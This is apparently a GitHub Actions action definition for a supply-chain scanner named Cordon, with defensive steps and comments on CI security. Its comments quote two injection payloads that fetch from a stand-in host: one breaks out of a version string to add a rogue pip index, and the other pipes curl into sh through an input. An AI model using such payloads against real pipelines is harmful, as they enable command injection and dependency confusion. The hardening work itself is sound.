name: "Cordon supply-chain scan"
description: >
  Scan a repository for malicious packages, suspicious install-time behaviour,
  leaked credentials and dependency risk.
author: "Cordon Contributors"

branding:
  icon: shield
  color: blue

inputs:
  target:
    description: "Path or archive to scan."
    required: false
    default: "."
  config:
    description: "Repository configuration file. Discovered automatically if unset."
    required: false
    default: ""
  policy:
    description: >
      Organisation policy file. Acts as a ceiling: a repository
      configuration cannot weaken anything it sets.
    required: false
    default: ""
  severity:
    description: "Report findings at or above this severity."
    required: false
    default: "low"
  fail-on:
    description: "Fail the job at or above this severity."
    required: false
    default: "high"
  fail-on-incomplete:
    description: >
      Treat a degraded scan as a failure. Off by default because it would break
      pipelines on the first very large repository, and a pipeline people append
      '|| true' to is worse than the failure it prevented. Turn it on for
      release builds, where a partial scan must not pass.
    required: false
    default: "false"
  sarif:
    description: "Produce a SARIF file."
    required: false
    default: "true"
  sarif-file:
    description: "Where to write the SARIF file."
    required: false
    default: "cordon.sarif"
  evidence:
    description: >
      none, masked or hash_only. Masked by default. Secret findings are always
      hash-only regardless of this setting.
    required: false
    default: "masked"
  working-directory:
    description: "Directory to run in."
    required: false
    default: "."

outputs:
  findings:
    description: "Number of findings that met the failure policy."
    value: ${{ steps.scan.outputs.findings }}
  sarif-file:
    description: "Path to the SARIF file, if one was produced."
    value: ${{ steps.scan.outputs.sarif-file }}
  complete:
    description: "Whether the scan completed without hitting a limit."
    value: ${{ steps.scan.outputs.complete }}

runs:
  using: composite
  steps:
    # pull_request_target runs with a writable token and the base repository's
    # secrets. A scanner that runs under it, in a job that also checks out the
    # head ref, executes untrusted code with write access -- which is the exact
    # misconfiguration this action detects in other people's workflows. It will
    # not participate in it.
    - name: Refuse pull_request_target
      if: github.event_name == 'pull_request_target'
      shell: bash
      run: |
        echo "::error::Cordon will not run under pull_request_target."
        echo "That trigger grants a writable token and repository secrets to a job"
        echo "that may check out untrusted code. Use pull_request instead."
        exit 1

    - name: Set up Python
      uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b # v5.3.0
      with:
        python-version: "3.12"

    - name: Install Cordon
      shell: bash
      env:
        # Passed through the environment, never interpolated into the script.
        # `env` resolves against the *calling* workflow, so a caller setting
        # CORDON_VERSION to `0.1.0" --extra-index-url "https://evil.invalid/simple`
        # broke out of the quotes and handed arbitrary arguments to pip -- a
        # dependency-confusion primitive against the security scanner itself.
        CORDON_VERSION: ${{ env.CORDON_VERSION || '0.1.0' }}
      run: |
        set -euo pipefail
        # Refuse anything that is not a version. The environment indirection
        # above removes the shell-quoting break; this removes the pip-argument
        # injection that survives it.
        if ! printf '%s' "$CORDON_VERSION" | grep -Eq '^[0-9]+\.[0-9]+(\.[0-9]+)?([ab.]?[0-9]+)?$'; then
          echo "::error::CORDON_VERSION is not a version number: $CORDON_VERSION"
          exit 1
        fi
        python -m pip install --disable-pip-version-check --quiet \
          "cordon-scanner==${CORDON_VERSION}"

    - name: Scan
      id: scan
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      env:
        # Every input reaches the script through the environment. Interpolating
        # `${{ }}` into a `run:` block expands it before bash parses the line,
        # so a caller passing `target: '."; curl -s https://evil.invalid | sh; #'`
        # executed arbitrary commands in the job. That is the same defect
        # SUSPECT.CI.FETCH_EXEC.001 and MALWARE.CI.SECRET_EXFIL.001 detect in
        # other people's workflows.
        CORDON_TARGET: ${{ inputs.target }}
        CORDON_SEVERITY: ${{ inputs.severity }}
        CORDON_FAIL_ON: ${{ inputs.fail-on }}
        CORDON_EVIDENCE: ${{ inputs.evidence }}
        CORDON_CONFIG: ${{ inputs.config }}
        CORDON_POLICY_FILE: ${{ inputs.policy }}
        CORDON_FAIL_ON_INCOMPLETE: ${{ inputs.fail-on-incomplete }}
        CORDON_SARIF: ${{ inputs.sarif }}
        CORDON_SARIF_FILE: ${{ inputs.sarif-file }}
      run: |
        set +e

        args=( scan "$CORDON_TARGET" )
        args+=( --severity "$CORDON_SEVERITY" )
        args+=( --fail-on "$CORDON_FAIL_ON" )
        args+=( --evidence "$CORDON_EVIDENCE" )
        args+=( --no-color )

        [ -n "$CORDON_CONFIG" ] && args+=( --config "$CORDON_CONFIG" )
        [ -n "$CORDON_POLICY_FILE" ] && args+=( --policy "$CORDON_POLICY_FILE" )
        [ "$CORDON_FAIL_ON_INCOMPLETE" = "true" ] && args+=( --fail-on-incomplete )

        # Three outputs at once: annotations on the diff, a machine-readable
        # result for the summary, and SARIF for code scanning.
        args+=( --format github )
        args+=( --format "json:cordon-result.json" )
        if [ "$CORDON_SARIF" = "true" ]; then
          args+=( --format "sarif:$CORDON_SARIF_FILE" )
        fi

        cordon "${args[@]}"
        code=$?
        set -e

        complete=$(python -c "import json;print(str(json.load(open('cordon-result.json'))['complete']).lower())" 2>/dev/null || echo unknown)
        count=$(python -c "import json;d=json.load(open('cordon-result.json'));print(sum(1 for f in d['findings'] if 'suppressed' not in f and f['category']!='operational'))" 2>/dev/null || echo 0)

        echo "findings=$count"            >> "$GITHUB_OUTPUT"
        echo "complete=$complete"         >> "$GITHUB_OUTPUT"
        echo "sarif-file=$CORDON_SARIF_FILE" >> "$GITHUB_OUTPUT"
        echo "exit-code=$code"            >> "$GITHUB_OUTPUT"

        # The job summary carries the readable report, rendered from the JSON
        # already produced above. It used to try `cordon report-summary`, which
        # is not a command, and fall back to running a second full scan of the
        # repository -- so the job paid for two scans, both failures were
        # swallowed by `|| true`, and neither was visible.
        python - <<'RENDER' >> "$GITHUB_STEP_SUMMARY" || true
        import json
        with open("cordon-result.json") as handle:
            result = json.load(handle)
        rows = [f for f in result["findings"] if f["category"] != "operational"]
        print("## Cordon\n")
        print(f"- findings: {len(rows)}")
        print(f"- complete: {result['complete']}\n")
        if rows:
            print("| severity | rule | location |")
            print("|---|---|---|")
            for f in rows[:50]:
                loc = f["location"]
                where = loc["path"] + (f":{loc['line']}" if loc.get("line") else "")
                print(f"| {f['severity']} | {f['rule_id']} | {where} |")
            if len(rows) > 50:
                print(f"\n_{len(rows) - 50} further findings omitted._")
        RENDER

        exit $code

    - name: Upload SARIF
      # `always()` so results still reach code scanning when the gate fails.
      # Uploading only on success would hide findings precisely when there are
      # some, which defeats the purpose of uploading at all.
      # hashFiles resolves against the workspace root while the file is written
      # relative to working-directory, so the two disagreed whenever they
      # differed and the upload was silently skipped. Both halves now use the
      # same path.
      if: always() && inputs.sarif == 'true'
        && hashFiles(format('{0}/{1}', inputs.working-directory, inputs.sarif-file)) != ''
      uses: github/codeql-action/upload-sarif@f779452ac5af1c261dce0346a8f964149f49322b # v3.26.13
      with:
        sarif_file: ${{ inputs.working-directory }}/${{ inputs.sarif-file }}
        category: cordon
